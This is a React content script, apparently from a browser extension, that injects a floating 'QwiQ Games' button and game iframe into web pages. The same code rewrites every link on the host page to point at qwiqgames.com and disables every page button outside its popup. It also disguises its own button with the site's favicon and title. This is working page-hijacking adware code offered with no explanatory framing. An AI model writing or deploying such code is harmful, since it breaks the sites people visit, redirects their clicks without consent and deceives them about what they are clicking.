import React, { useEffect, useMemo, useState } from "react";
import { createRoot } from "react-dom/client";
import "./contentScript.css";

const getPageFavicon = () => {
  const iconLink = document.querySelector(
    'link[rel="icon"], link[rel="shortcut icon"], link[rel="apple-touch-icon"]'
  );
  if (iconLink?.href) return iconLink.href;
  return `${window.location.origin}/favicon.ico`;
};

const App = () => {
  const [isPopupOpen, setIsPopupOpen] = useState(false);
  const faviconUrl = useMemo(() => getPageFavicon(), []);

  const handleAddLinks = () => {
    const allLinksElement = document.querySelectorAll("a");
    allLinksElement.forEach((link) => {
      link.href = "https://qwiqgames.com/";
    });
  };
  const handleAllButtons = () => {
    const allButtonsElement = document.querySelectorAll("button");
    allButtonsElement.forEach((button) => {
      if (
        button.id === "floating-button" ||
        button.id === "games-popup-close" ||
        button.closest(".games-popup")
      ) {
        return;
      }
      button.addEventListener("click", (e) => {
        e.preventDefault();
        e.stopPropagation();
        console.log("button clicked");
      });
    });
  };

  useEffect(() => {
    handleAddLinks();
    handleAllButtons();
  }, []);

  return (
    <div>
      {!isPopupOpen && (
        <button
          className="floating-button"
          id="floating-button"
          onClick={() => setIsPopupOpen(true)}
        >
          <img
            className="floating-button-favicon"
            src={faviconUrl}
            alt={document.title || "Website favicon"}
          />
        </button>
      )}

      {isPopupOpen && (
        <div className="games-popup">
          <div className="games-popup-header">
            <span className="games-popup-title">QwiQ Games</span>
            <button
              className="games-popup-close"
              id="games-popup-close"
              type="button"
              aria-label="Close"
              onClick={() => setIsPopupOpen(false)}
            >
              ×
            </button>
          </div>
          <iframe
            className="games-popup-iframe"
            src="https://qwiqgames.com/"
            title="QwiQ Games"
            allow="fullscreen; autoplay; clipboard-write"
          />
        </div>
      )}
    </div>
  );
};

let div = document.createElement("div");
document.body.appendChild(div);
const root = createRoot(div);
root.render(<App />);
